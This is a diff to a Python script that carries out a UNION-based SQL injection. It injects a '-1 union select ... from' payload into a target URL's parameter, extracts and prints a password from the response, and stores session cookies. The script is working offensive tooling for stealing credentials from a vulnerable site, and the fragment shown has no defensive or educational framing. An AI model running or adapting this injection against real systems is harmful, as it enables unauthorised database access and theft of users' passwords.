@@ -23,11 +23,12 @@ def main():
     # Search for the desired data
     if len(finds) <= len(list_of_visible):
         for i, f in enumerate(finds):
+            # Replace the displayed fields in list_of_columns with the desired parameters
             list_of_columns[int(list_of_visible[i]) - 1] = f
     else:
         print('too small visible list')
         exit(1)
-    keys = tg.find_param(url, list_of_columns, list_of_visible, html_visible,
+    keys = tg.find_param(url, len(finds), html_visible,
                          f"-1 union select {','.join(list_of_columns)} from {base_name}",
                          'cat')
 
@@ -39,6 +40,7 @@ def main():
     passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
     print('password:', passw)
 
+    # Save cookie
     try:
         with open('cooks.pickle', 'rb') as f:
             cooks = pickle.load(f)
